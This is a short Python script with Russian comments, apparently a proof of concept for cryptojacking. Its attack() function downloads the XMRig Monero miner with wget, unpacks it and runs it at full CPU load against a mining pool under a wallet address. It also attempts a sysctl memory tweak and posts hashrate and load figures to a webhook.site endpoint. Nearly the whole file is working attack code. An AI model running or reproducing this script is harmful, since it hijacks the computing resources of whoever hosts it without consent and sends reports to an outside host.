import os
import subprocess
import json
import http.client
import time
import re

HOOK_DOMAIN = "webhook.site"
HOOK_PATH = "/d9ed8938-0733-4ce3-8d2c-63dab5606e87"

def send_stat(hashrate, load):
    try:
        conn = http.client.HTTPSConnection(HOOK_DOMAIN, timeout=5)
        payload = json.dumps({
            "EVENT": "MAX_HASH_REPORT",
            "H": hashrate,
            "L": load,
            "CORES": 32
        })
        conn.request("POST", HOOK_PATH, payload, {"Content-Type": "application/json"})
        conn.getresponse()
        conn.close()
    except: pass

def attack():
    # 1. Подготовка (пытаемся выжать максимум из памяти)
    os.system("sysctl -w vm.nr_hugepages=1280 || echo 'No root for hugepages'")
    
    # 2. Скачивание (если еще нет)
    if not os.path.exists("./xmrig"):
        os.system("wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz -O xm.tar.gz")
        os.system("tar -xf xm.tar.gz && mv xmrig-6.21.0/xmrig ./xmrig")

    # 3. Запуск с агрессивными флагами
    # --no-color и --print-time 5 для удобства парсинга
    # --randomx-mode=fast форсируем использование 2ГБ датасета
    cmd = [
        "./xmrig", 
        "-o", "donate.v2.xmrig.com:3333", 
        "-u", "44AFFq5kSiGBo3SBYnrYcyEC2UWXSp2B8F6K8sZ9z41YhUrX7ivU", 
        "--cpu-max-threads-hint", "100",
        "--randomx-mode", "fast",
        "--print-time", "5",
        "--no-color"
    ]
    
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)

    print("[*] PoC Running. Waiting for Dataset initialization...")
    
    for line in iter(process.stdout.readline, ""):
        # Ищем строку с хешрейтом: "speed 10s/60s/15m 12500.0 n/a n/a H/s"
        if "speed" in line and "H/s" in line:
            match = re.search(r"speed \d+s/\d+s/\d+m\s+([\d\.]+)", line)
            if match:
                current_h = match.group(1)
                load = os.getloadavg()
                send_stat(f"{current_h} H/s", load)
                print(f"[>] SHOT: {current_h} H/s | Load: {load[0]}")

if __name__ == "__main__":
    attack()
